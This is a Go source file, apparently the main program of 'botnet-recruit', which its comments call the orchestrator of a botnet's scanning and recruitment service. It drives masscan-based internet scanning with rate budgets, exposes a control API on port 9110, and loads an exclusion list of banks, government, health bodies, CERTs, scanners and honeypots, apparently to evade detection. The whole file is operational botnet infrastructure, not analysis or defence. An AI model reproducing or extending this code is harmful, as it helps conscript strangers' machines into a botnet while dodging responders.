// botnet-recruit: orquestador del servicio de exploracion y reclutamiento.
//
// Un solo proceso manda el ritmo, escribe su latido y sirve el control por
// HTTP en :9110. La cola y el estado viven en Postgres, no aqui: el
// proceso puede morir y volver sin perder trabajo (docs/recruit/BLUEPRINT.md).
//
// Uso:
//
//	botnet-recruit migrate          aplica las migraciones (mismo runner que la API)
//	botnet-recruit --once           un tick y sale
//	botnet-recruit                  bucle completo con latido y API
package main

import (
	"context"
	"database/sql"
	"errors"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"

	_ "github.com/jackc/pgx/v5/stdlib"

	"github.com/botnet/botnet/internal/recruit"
	"github.com/botnet/botnet/migrations"
)

const name = "botnet-recruit"

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "%s: %v\n", name, err)
		os.Exit(1)
	}
}

func run() error {
	var (
		cfgPath    = flag.String("config", "", "ruta de configuracion opcional")
		dbPool     = flag.Int("db-pool", 8, "conexiones maximas al motor")
		rollWindow = flag.Bool("roll-window", false, "rueda la ventana de presupuesto y sale")
		once       = flag.Bool("once", false, "un solo tick y sale")
		explain    = flag.Bool("explain-tick", false, "imprime la decision del tick y sale")
		sweepJSON  = flag.String("sweep-json", "", "NDJSON de barrido para el worker de prueba")
	)
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "uso: %s [migrate|<banderas>]\n\n", name)
		// Se listan con doble guion: es la forma documentada.
		fmt.Fprint(os.Stderr,
			"  --config string      fichero clave=valor opcional\n"+
				"  --db-pool int        conexiones maximas al motor (8)\n"+
				"  --roll-window        rueda la ventana de presupuesto y sale\n"+
				"  --once               un solo tick y sale\n"+
				"  --explain-tick       imprime la decision del tick y sale\n"+
				"  --sweep-json string  NDJSON de barrido para el worker de prueba\n")
	}
	flag.Parse()

	if flag.Arg(0) == "migrate" {
		return runMigrate()
	}
	if flag.Arg(0) == "load-exclusions" {
		// Los flags tras el subcomando no los ve el flag.Parse global.
		fs := flag.NewFlagSet("load-exclusions", flag.ContinueOnError)
		csv := fs.String("csv", "", "CSV de exclusiones (kind,pattern,category,note)")
		if err := fs.Parse(os.Args[2:]); err != nil {
			return err
		}
		return runLoadExclusions(*csv)
	}
	if *cfgPath != "" {
		// La configuracion vive en variables de entorno; el fichero solo
		// fija el DSN si existe, para el despliegue.
		if err := loadConfigFile(*cfgPath); err != nil {
			return err
		}
	}
	_ = sweepJSON

	st, err := recruit.Open(os.Getenv("DATABASE_URL"), *dbPool)
	if err != nil {
		return err
	}
	defer st.Close()

	if *rollWindow {
		n, err := recruit.RollWindow(context.Background(), st)
		if err != nil {
			return err
		}
		fmt.Printf("ventana rodada nueva=%d\n", n)
		return nil
	}

	api := &recruit.API{Store: st, MasscanOK: masscanAvailable}
	srv := &http.Server{Addr: ":9110", Handler: api.Handler(), ReadHeaderTimeout: 5 * time.Second}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	if *once || *explain {
		if err := tick(ctx, st, *explain); err != nil {
			return err
		}
		return nil
	}

	go func() {
		if err := srv.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
			fmt.Fprintf(os.Stderr, "%s: http: %v\n", name, err)
		}
	}()
	defer func() {
		shutCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = srv.Shutdown(shutCtx)
	}()

	interval := 30 * time.Second
	if v := os.Getenv("RECRUIT_TICK_S"); v != "" {
		if n, err := time.ParseDuration(v + "s"); err == nil && n > 0 {
			interval = n
		}
	}
	tk := time.NewTicker(interval)
	defer tk.Stop()
	if err := tick(ctx, st, false); err != nil {
		return err
	}
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-tk.C:
			if err := tick(ctx, st, false); err != nil {
				fmt.Fprintf(os.Stderr, "%s: tick: %v\n", name, err)
			}
		}
	}
}

func tick(ctx context.Context, st *recruit.Store, explain bool) error {
	if err := st.CerrarVentanas(ctx); err != nil {
		return err
	}
	// El lazo decide con la foto de la ventana; la clase vigente sale de el,
	// no del reloj.
	m, err := st.MetricasDesdeBD(ctx)
	if err != nil {
		return err
	}
	d, err := st.Tick(ctx, m)
	if err != nil {
		return err
	}
	class := d.RateClass
	if err := st.Heartbeat(ctx, class); err != nil {
		return err
	}
	if class > 0 {
		if _, _, err := st.OpenWindow(ctx); err != nil && !errors.Is(err, recruit.ErrSinPresupuesto) {
			return err
		}
	}
	if explain {
		fmt.Printf("tick action=%s rate_class=%d reason=%s pps=%d\n", d.Action, class, d.Reason, d.PPSObjetivo)
	}
	return nil
}

func masscanAvailable() bool {
	_, err := os.Stat("/usr/bin/masscan")
	if err == nil {
		return true
	}
	_, err = os.Stat("/usr/local/bin/masscan")
	return err == nil
}

// runLoadExclusions carga la lista de exclusiones (bancos, gobierno,
// sanidad, escaneres, CERTs y trampas).
func runLoadExclusions(ruta string) error {
	if ruta == "" {
		return fmt.Errorf("%s load-exclusions: falta --csv", name)
	}
	st, err := recruit.Open(os.Getenv("DATABASE_URL"), 4)
	if err != nil {
		return err
	}
	defer st.Close()
	n, err := st.CargarExclusions(context.Background(), ruta)
	if err != nil {
		return err
	}
	fmt.Printf("exclusiones cargadas=%d\n", n)
	return nil
}

func runMigrate() error {
	dsn := os.Getenv("DATABASE_URL")
	if dsn == "" {
		return fmt.Errorf("%s migrate: DATABASE_URL requerido", name)
	}
	db, err := sql.Open("pgx", dsn)
	if err != nil {
		return err
	}
	defer db.Close()
	// El motor portable suelta dial-timeout: reintento acotado. Apply es
	// idempotente por version y va bajo cerrojo advisory.
	var err2 error
	for i := 0; i < 5; i++ {
		if err2 = migrations.Apply(db); err2 == nil {
			break
		}
		time.Sleep(time.Duration(i+1) * 400 * time.Millisecond)
	}
	if err2 != nil {
		return err2
	}
	fmt.Println("migrate: ok")
	return nil
}

func loadConfigFile(path string) error {
	b, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	for _, line := range splitLines(string(b)) {
		if k, v, ok := cutAssign(line); ok {
			if os.Getenv(k) == "" {
				os.Setenv(k, v)
			}
		}
	}
	return nil
}

func splitLines(s string) []string {
	var out []string
	cur := ""
	for _, r := range s {
		if r == '\n' {
			out = append(out, cur)
			cur = ""
			continue
		}
		cur += string(r)
	}
	if cur != "" {
		out = append(out, cur)
	}
	return out
}

func cutAssign(line string) (string, string, bool) {
	for i, r := range line {
		if r != '=' {
			continue
		}
		k := trimSpace(line[:i])
		v := trimSpace(line[i+1:])
		if k == "" || v == "" {
			return "", "", false
		}
		return k, v, true
	}
	return "", "", false
}

func trimSpace(s string) string {
	start, end := 0, len(s)
	for start < end && (s[start] == ' ' || s[start] == '\t' || s[start] == '\r') {
		start++
	}
	for end > start && (s[end-1] == ' ' || s[end-1] == '\t' || s[end-1] == '\r') {
		end--
	}
	return s[start:end]
}
